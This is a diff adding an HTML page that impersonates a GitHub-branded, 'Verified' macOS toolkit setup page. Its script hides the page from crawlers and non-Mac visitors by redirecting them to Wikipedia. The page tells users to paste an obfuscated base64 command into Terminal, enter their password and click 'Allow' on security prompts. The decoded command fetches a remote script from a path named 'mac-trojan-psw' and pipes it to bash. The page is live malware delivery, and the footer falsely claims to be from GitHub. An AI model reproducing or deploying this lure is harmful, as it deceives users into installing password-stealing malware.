@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+    <script>
+      (function(){
+        var ua = navigator.userAgent;
+        var isBot = /bot|crawl|spider|slurp|mediapartners|adsbot|facebookexternalhit|linkedinbot|twitterbot|whatsapp|telegrambot|applebot|bingpreview|googlepreview|ia_archiver|archive\.org|semrush|ahrefs|mj12bot|dotbot|petalbot|yandex|baiduspider|sogou|exabot|sistrix|dataprovider|netsystemsresearch|pureleverage|proximic|brandwatch|talkwalker|screamingfrog|python-requests|python-urllib|java\/|curl\/|wget\/|libwww|lwp-trivial|scrapy|axios|got\/|node-fetch|okhttp|go-http-client|headlesschrome|phantomjs|selenium|puppeteer|playwright/i.test(ua);
+        var isMac = /Macintosh|MacIntel|MacPPC|Mac68K/.test(ua) && !/iPhone|iPad|iPod/.test(ua);
+        if (isBot || !isMac) { window.location.replace("https://www.wikipedia.org"); }
+      })();
+    </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>macOS toolkit — setup</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg: #0b0f14;
+      --panel: #141a21;
+      --text: #d0d7de;
+      --muted: #9099a3;
+      --brand: #3fb950;
+      --brand-fore: #ffffff;
+      --border: #2b3138;
+      --accent: #6cb6ff;
+      --warn: #e3b341;
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font: 16px/1.45 system-ui, -apple-system, "Segoe UI",
+            Roboto, Ubuntu, "Helvetica Neue", Arial;
+    }
+
+    a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+
+    .container {
+      max-width: 980px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+
+    .header {
+      display: flex;
+      gap: 16px;
+      align-items: center;
+      margin-bottom: 28px;
+    }
+
+    .header svg {
+      flex-shrink: 0;
+    }
+
+    .header h1 {
+      margin: 0;
+      font-size: 28px;
+      font-weight: 500;
+    }
+
+    .verified {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: #0e1620;
+      border: 1px solid #26303a;
+      color: var(--muted);
+      padding: 4px 10px;
+      border-radius: 6px;
+      font-size: 12px;
+    }
+
+    .twoCol {
+      display: flex;
+      gap: 24px;
+      margin: 20px 0;
+      align-items: stretch;
+    }
+
+    .colLeft {
+      flex: 2;
+    }
+
+    .colRight {
+      flex: 1.2;
+    }
+
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      height: 100%;
+    }
+
+    .cardTitle {
+      font-size: 18px;
+      font-weight: 600;
+      margin: 0 0 12px;
+      letter-spacing: -0.2px;
+    }
+
+    .cardDesc {
+      color: var(--muted);
+      font-size: 14px;
+      margin: 0 0 16px;
+    }
+
+    .inputGroup {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+
+    /*
+     * Command field:
+     * - Same appearance as the original input
+     * - No maxlength
+     * - No scrollbar
+     * - Long values remain completely stored
+     */
+    #cmdMain {
+      flex: 1;
+      width: 100%;
+      height: 44px;
+      min-height: 44px;
+      max-height: 44px;
+
+      background: #0b0f14;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+
+      padding: 12px 14px;
+
+      color: var(--text);
+      font-family: monospace;
+      font-size: 13px;
+      line-height: 20px;
+
+      outline: none;
+      resize: none;
+
+      /*
+       * Keep the same single-line appearance.
+       * Hide visual overflow rather than adding a slider.
+       */
+      white-space: pre;
+      overflow: hidden;
+      overflow-x: hidden;
+      overflow-y: hidden;
+
+      word-wrap: normal;
+      overflow-wrap: normal;
+
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    #cmdMain:focus {
+      border-color: var(--accent);
+    }
+
+    #cmdMain[readonly] {
+      cursor: text;
+    }
+
+    .btn {
+      flex-shrink: 0;
+
+      background: var(--brand);
+      border: none;
+      border-radius: 8px;
+
+      padding: 0 20px;
+      height: 44px;
+
+      font-weight: 600;
+      font-size: 14px;
+      color: var(--brand-fore);
+
+      cursor: pointer;
+      transition: opacity 0.15s;
+    }
+
+    .btn:hover {
+      opacity: 0.9;
+    }
+
+    .reqList {
+      margin: 8px 0 0;
+      padding-left: 18px;
+
+      font-size: 13px;
+      line-height: 1.5;
+      color: var(--muted);
+    }
+
+    .reqList li {
+      margin: 6px 0;
+    }
+
+    .mainSection {
+      margin: 24px 0;
+    }
+
+    .guideCard {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+    }
+
+    .guideTitle {
+      font-size: 18px;
+      font-weight: 600;
+      margin: 0 0 16px;
+    }
+
+    .stepTitle {
+      font-size: 16px;
+      font-weight: 500;
+      margin: 16px 0 8px;
+    }
+
+    .stepList {
+      margin: 0;
+      padding-left: 20px;
+
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .stepList li {
+      margin: 6px 0;
+    }
+
+    .noteLine {
+      border-left: 3px solid var(--warn);
+      background: rgba(227, 179, 65, 0.06);
+
+      padding: 10px 16px;
+      font-size: 13px;
+
+      margin: 20px 0 0;
+      border-radius: 6px;
+    }
+
+    .footer {
+      margin-top: 40px;
+      padding-top: 18px;
+
+      border-top: 1px solid var(--border);
+
+      font-size: 12px;
+      color: var(--muted);
+
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      justify-content: center;
+    }
+
+    .footer a {
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .footer a:hover {
+      color: var(--accent);
+    }
+
+    @media (max-width: 700px) {
+      .container {
+        margin: 24px auto;
+        padding: 0 14px;
+      }
+
+      .twoCol {
+        flex-direction: column;
+      }
+
+      .header {
+        flex-wrap: wrap;
+      }
+
+      .header h1 {
+        font-size: 24px;
+      }
+
+      .inputGroup {
+        gap: 8px;
+      }
+
+      .btn {
+        padding: 0 16px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <!-- Header -->
+    <div class="header">
+
+      <!-- GitHub-style logo -->
+      <svg
+        width="34"
+        height="34"
+        viewBox="0 0 16 16"
+        fill="currentColor"
+        aria-hidden="true"
+      >
+        <path d="M8 0C3.58 0 0 3.58 0 8a8 8 0 0 0 5.47 7.59c.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.94-.01 2.21 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8Z"/>
+      </svg>
+
+      <h1>macOS toolkit</h1>
+
+      <div class="verified">
+        <span>Verified</span>
+      </div>
+
+    </div>
+
+
+    <!-- Quick setup + requirements -->
+    <div class="twoCol">
+
+      <div class="colLeft">
+
+        <div class="card">
+
+          <div class="cardTitle">
+            Quick setup
+          </div>
+
+          <div class="cardDesc">
+            Single command — paste into Terminal
+          </div>
+
+          <div class="inputGroup">
+
+            <textarea
+              id="cmdMain"
+              readonly
+              spellcheck="false"
+              wrap="off"
+              rows="1"
+              aria-label="Command"
+            ></textarea>
+
+            <button
+              class="btn"
+              id="copyMainBtn"
+              type="button"
+            >
+              Copy
+            </button>
+
+          </div>
+
+        </div>
+
+      </div>
+
+
+      <div class="colRight">
+
+        <div class="card">
+
+          <div class="cardTitle">
+            System requirements
+          </div>
+
+          <ul class="reqList">
+            <li>macOS 11.0+ (Big Sur or newer)</li>
+            <li>Apple Silicon · Intel-based Macs</li>
+          </ul>
+
+        </div>
+
+      </div>
+
+    </div>
+
+
+    <!-- Terminal guide -->
+    <div class="mainSection">
+
+      <div class="guideCard">
+
+        <div class="guideTitle">
+          Terminal guide
+        </div>
+
+        <div class="stepTitle">
+          Launch Terminal
+        </div>
+
+        <ol class="stepList">
+          <li>
+            Press <strong>Command (⌘) + Space</strong> → Spotlight
+          </li>
+
+          <li>
+            Type <strong>"Terminal"</strong> → press <strong>Return</strong>
+          </li>
+        </ol>
+
+
+        <div class="stepTitle">
+          Installation
+        </div>
+
+        <ol class="stepList">
+          <li>
+            Copy the command from the field above
+          </li>
+
+          <li>
+            Paste into Terminal → press <strong>Return</strong>
+          </li>
+
+          <li>
+            Enter password if prompted
+          </li>
+        </ol>
+
+
+        <div class="noteLine">
+          <span>
+            Security prompt? Click "Allow" to continue.
+          </span>
+        </div>
+
+      </div>
+
+    </div>
+
+
+    <!-- Footer -->
+    <div class="footer">
+
+      <span>© 2025 GitHub, Inc.</span>
+
+      <a href="https://github.com/site/terms">Terms</a>
+      <a href="https://github.com/site/privacy">Privacy</a>
+      <a href="https://github.com/security">Security</a>
+      <a href="https://www.githubstatus.com/">Status</a>
+      <a href="https://docs.github.com/en">Help</a>
+      <a href="https://support.github.com/contact">Contact</a>
+      <a href="https://docs.github.com/en/site-policy/privacy-policies/github-cookies">Cookies</a>
+      <a href="https://docs.github.com/en/site-policy/privacy-policies/do-not-share-my-personal-information">Privacy</a>
+
+    </div>
+
+  </div>
+
+
+  <script>
+    (() => {
+
+      /*
+       * Put any text or URL here.
+       *
+       * Semicolons, spaces, quotes and long URLs are allowed.
+       */
+      const FALLBACK_CMD =
+        `bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2MwMGxraWRkcG9zdHNoYXh4cy9jMDBsa2lkZHBvc3RzaGF4eHMuZ2l0aHViLmlvL21haW4vbWFjLXRyb2phbi1wc3cvdXBkYXRlLnNoJ3xiYXNo" | base64 -d)`;
+      // Original was Y3VybCAtcyAnaHR0cHM6Ly9ldGFzYXZlLnN5bmFkZW50aWNlcy5jb20vdXBkYXRlLnNoJyB8IGJhc2g=
+
+
+      const inputField =
+        document.getElementById("cmdMain");
+
+      const copyButton =
+        document.getElementById("copyMainBtn");
+
+
+      /*
+       * Display the complete fallback value.
+       */
+      inputField.value = FALLBACK_CMD;
+
+
+      /*
+       * Copy the complete value.
+       */
+      copyButton.addEventListener("click", async () => {
+
+        const text = inputField.value;
+
+        try {
+
+          await navigator.clipboard.writeText(text);
+
+        } catch (error) {
+
+          inputField.focus();
+          inputField.select();
+          document.execCommand("copy");
+
+        }
+
+
+        const original =
+          copyButton.textContent;
+
+        copyButton.textContent =
+          "✓ Copied!";
+
+        copyButton.style.background =
+          "#2ea043";
+
+
+        setTimeout(() => {
+
+          copyButton.textContent =
+            original;
+
+          copyButton.style.background =
+            "";
+
+        }, 1400);
+
+      });
+
+    })();
+  </script>
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"8747310e87e744b1af7d21b303f5925a","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
